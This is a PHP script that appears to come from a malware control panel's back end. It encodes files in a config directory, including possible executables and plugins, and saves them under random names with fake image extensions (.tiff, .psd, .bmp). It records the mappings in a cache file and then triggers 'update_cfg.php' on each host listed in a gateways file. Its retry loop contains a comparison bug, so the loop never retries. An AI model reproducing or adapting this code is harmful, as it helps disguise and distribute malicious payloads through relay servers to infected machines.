#!/usr/bin/env php
<?php

$ext = array('tiff', 'psd', 'bmp');

$dir = pathinfo(__FILE__, PATHINFO_DIRNAME) . '/';
$dir = realpath('../../') . '/';

include_once($dir . 'includes/functions.rc.php');

file_put_contents($dir . 'cache/cfg_list.db', '');

$cfg_dir = $dir . 'cfg/';
$cfg = scandir($cfg_dir, false);
unset($cfg[0], $cfg[1]);

foreach($cfg as $key => $file){
	if($file != '.htaccess' && $file != '.' && $file != '..'){
		switch(pathinfo($file, PATHINFO_EXTENSION)){
			case 'tiff':
			case 'psd':
			case 'bmp':
				unset($cfg[$key]);
				@unlink($cfg_dir . $file);
			break;
		}
	}
}

$new_format = '';
foreach($cfg as $file){
	if($file != '.htaccess' && $file != '.' && $file != '..'){
		switch(pathinfo($file, PATHINFO_EXTENSION)){
			case '':
				$rcfile = generatePassword(mt_rand(6, 32)) . '.' . $ext[mt_rand(0, 2)];
				$wf = false;
				
				do{
					if(file_exists($cfg_dir . $rcfile)) @unlink($cfg_dir . $rcfile);
					file_put_contents($cfg_dir . $rcfile, rc_encode(file_get_contents($cfg_dir . $file)));
					
					if(md5(rc_decode(file_get_contents($cfg_dir . $rcfile))) != md5(file_get_contents($cfg_dir . $file))){
						$wf == true;
						usleep(100000);
					}else{
						$wf = false;
					}
				}while($wf == true);
				
				file_put_contents($dir . 'cache/cfg_list.db', $file . '|' . $rcfile . "\r\n", FILE_APPEND);
				$new_format .= $file . '|' . $rcfile . '|' . md5(file_get_contents($cfg_dir . $file)) . "\r\n";
			break;
    		
			case 'tiff':
			case 'psd':
			case 'bmp':
				@unlink($cfg_dir . $file);
			break;
		
			case 'exe':
				//@unlink($cfg_dir . $file);
			break;
       		
			default:			
				/*
				$psd_file = str_replace('.plug', '.psd', $file);
				$psd_file = str_replace('.bin', '.tiff', $psd_file);
				if(file_exists($cfg_dir . $psd_file)) @unlink($cfg_dir . $psd_file);
				file_put_contents($cfg_dir . $psd_file, rc_encode(file_get_contents($cfg_dir . $file)));
				*/
				
				$rcfile = generatePassword(mt_rand(6, 32)) . '.' . $ext[mt_rand(0, 2)];
				$wf = false;
				
				do{
					if(file_exists($cfg_dir . $rcfile)) @unlink($cfg_dir . $rcfile);
					file_put_contents($cfg_dir . $rcfile, rc_encode(file_get_contents($cfg_dir . $file)));
					
					if(md5(rc_decode(file_get_contents($cfg_dir . $rcfile))) != md5(file_get_contents($cfg_dir . $file))){
						$wf == true;
						usleep(100000);
					}else{
						$wf = false;
					}
				}while($wf == true);
				
				file_put_contents($dir . 'cache/cfg_list.db', $file . '|' . $rcfile . "\r\n", FILE_APPEND);
				$new_format .= $file . '|' . $rcfile . '|' . md5(file_get_contents($cfg_dir . $file)) . "\r\n";
			break;
		}
	}
}
if(!empty($new_format)) file_put_contents($dir . 'cache/cfg_list.db', "\r\n\r\n" . $new_format, FILE_APPEND);

if(file_exists($dir . 'cache/gateways.json')){
	$gws = file_get_contents($dir . 'cache/gateways.json');
	if(!empty($gws)){
		$gws = json_decode($gws, 1);

		foreach($gws as $u){
			file_get_contents('http://' . $u . '/update_cfg.php', false);
		}
	}
}

?>